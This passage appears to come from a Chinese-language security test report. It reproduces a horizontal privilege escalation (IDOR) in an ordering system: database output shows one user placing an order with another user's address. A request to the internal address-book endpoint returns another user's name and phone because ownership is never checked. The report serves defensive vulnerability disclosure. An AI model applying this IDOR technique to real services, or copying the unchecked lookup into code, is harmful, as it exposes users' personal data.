三、数据库结果（越权成功）
----------------------------------------------------
mysql> select count(*) from orders;  --> 23（新增 1 条）
mysql> select id,number,user_id,consignee,phone,amount,remark,status
       from orders where user_id in (4,5) order by id desc limit 3;
+----+---------------+---------+-----------+-------------+--------+---------------+--------+
| id | number        | user_id | consignee | phone       | amount | remark        | status |
+----+---------------+---------+-----------+-------------+--------+---------------+--------+
| 40 | 1792580467026 |       5 | lisally   | 13212345678 |   6.00 | T26-IDOR-test |      1 |
| 27 | 1791586423092 |       4 | lisally   | 13212345678 |  79.00 | NULL          |      2 |
| 26 | 1791584592947 |       4 | lisally   | 13212345678 |  79.00 | NULL          |      2 |
+----+---------------+---------+-----------+-------------+--------+---------------+--------+

结论：订单 40 的 user_id=5（User B），但 consignee/phone 来自 User A 的地址簿 id=2，
说明 User B 成功使用 User A 的收货信息下单，水平越权复现成功。

四、根因直接证据（内网接口未校验归属）
----------------------------------------------------
直接请求 user-service 内网接口（模拟 Feign 调用，携带 5 的身份头）：

GET http://127.0.0.1:8081/inner/addressBook/2

{"code":1,"msg":null,"data":{"consignee":"lisally","phone":"13212345678"}}

InnerAddressBookController#getById 仅按主键查询、未按 userId 过滤。
